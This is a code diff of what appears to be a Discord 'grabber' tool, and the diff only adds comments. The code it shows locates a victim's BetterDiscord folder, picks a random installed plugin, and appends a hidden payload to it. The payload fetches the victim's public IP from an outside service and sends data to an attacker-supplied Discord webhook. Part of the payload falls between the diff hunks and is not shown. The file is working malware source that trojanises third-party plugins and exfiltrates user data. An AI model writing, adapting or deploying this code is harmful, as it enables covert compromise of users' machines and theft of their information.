@@ -1,9 +1,11 @@
 // https://github.com/Infinixius/bettergrabber
 // spaghetti code incoming
 const fs = require("fs")
+// betterdiscord path
 const bdfolder = process.env.APPDATA+"\\BetterDiscord"
 var webhook = ""
 if (!webhook){throw "Please provide a webhook on line 3."}
+// this is the code that is inserted into the end of the plugin
 const payload = `
 require("request").get("https://api.ipify.org", async (err, res, body) => {
   const options = {
@@ -29,19 +31,23 @@ require("request")(options, async (err, res, body) => {
 });
 `
 
+// we read from bdstorage.json to check if betterdiscord is indeed installed
 fs.readFile(bdfolder+"\\bdstorage.json", "utf8",  function (err,data) {
     if (err) {
         console.log(err)
     } else {
+        // get a list of all plugins
         var files = fs.readdirSync(bdfolder+"\\plugins", { withFileTypes: true })
             .filter(dirent => dirent.isFile())
             .filter(dirent => dirent.name.endsWith(".plugin.js"))
             .map(dirent => dirent.name)
         let items = Array.from(files)
+        // pick a random plugim
         const file = items[Math.floor(Math.random() * items.length)]
         fs.readFile(bdfolder+"\\plugins\\"+file, function(err, buf) {
             var data = buf.toString()
 
+            // insert the payload
             fs.writeFile(bdfolder+"\\plugins\\"+file, data+"\n"+payload, (err) => {
                 console.log(file)
                 if (err) throw err; 
